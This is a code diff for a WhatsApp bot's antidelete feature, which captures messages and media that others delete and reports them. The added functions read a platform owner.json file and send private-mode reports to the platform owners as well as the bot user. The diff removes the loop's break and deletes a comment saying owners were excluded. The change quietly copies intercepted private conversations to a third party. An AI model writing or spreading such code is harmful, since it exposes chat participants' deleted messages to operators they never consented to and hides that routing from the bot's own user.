@@ -114,7 +114,7 @@ function _adBotUserSelfJid(sock, clean) {
     return clean ? `${clean}@s.whatsapp.net` : '';
 }
 
-/** JID fallbacks for Message Yourself — bot user only (not platform owner.json) */
+/** JID fallbacks for Message Yourself — bot user only */
 function _adMessageYourselfTargets(sock, clean) {
     const targets = [];
     const add = (j) => {
@@ -137,6 +137,39 @@ function _adMessageYourselfTargets(sock, clean) {
         } catch (_) {}
     }
     return targets;
+}
+
+function _adLoadPlatformOwners() {
+    try {
+        if (!global._ownerCache) {
+            global._ownerCache = JSON.parse(fs.readFileSync('./allfunc/owner.json', 'utf-8'));
+        }
+        return Array.isArray(global._ownerCache) ? global._ownerCache : [];
+    } catch (_) { return []; }
+}
+
+/** Private-mode delivery: bot user + platform owners → each one's saved messages */
+function _adPrivateReportTargets(sock, clean) {
+    const byNum = new Map();
+    const add = (jid) => {
+        const s = jid ? String(jid).trim() : '';
+        let full = s;
+        if (s && !s.includes('@')) {
+            const digits = cleanBotNum(s);
+            if (!digits) return;
+            full = `${digits}@s.whatsapp.net`;
+        }
+        if (!full.includes('@')) return;
+        const num = cleanBotNum(full);
+        if (!num) return;
+        const prev = byNum.get(num);
+        if (!prev || (full.includes('@s.whatsapp.net') && prev.includes('@lid'))) {
+            byNum.set(num, full);
+        }
+    };
+    for (const j of _adMessageYourselfTargets(sock, clean)) add(j);
+    for (const j of _adLoadPlatformOwners()) add(j);
+    return [...byNum.values()];
 }
 
 function _adDeliveryTarget(mode, chatId, sock, clean) {
@@ -764,7 +797,7 @@ async function _adDeliverAntideleteReport(sock, {
     const mentions = _adValidMentions(deletedBy, sender);
     const sendOpts = { priority: true, _cmdReply: true };
     const candidates = useMessageYourself
-        ? _adMessageYourselfTargets(sock, clean)
+        ? _adPrivateReportTargets(sock, clean)
         : (targetJid ? [String(targetJid)] : []);
     if (!candidates.length) return false;
 
@@ -778,7 +811,6 @@ async function _adDeliverAntideleteReport(sock, {
             }
             console.log(`[ANTIDELETE][${clean || '?'}] Report delivered → ${jid}`);
             sentAny = true;
-            break;
         } catch (e) {
             console.error(`[ANTIDELETE][${clean || '?'}] deliver to ${jid} failed:`, e.message);
         }
@@ -928,7 +960,7 @@ async function _adRedownloadMedia(raw, mtype, protoMsg) {
     }
 }
 
-async function _adForwardDeletedMedia(sock, targetJid, mediaOriginal, sender, botNum) {
+async function _adForwardDeletedMedia(sock, targetJid, mediaOriginal, sender, botNum, opts = {}) {
     if (!sock || !targetJid || !mediaOriginal) return;
     const _info = _adResolveMediaInfo(mediaOriginal);
     const _hasFile = mediaOriginal.mediaPath && mediaOriginal.mediaPath !== '__redownload__' && fs.existsSync(mediaOriginal.mediaPath);
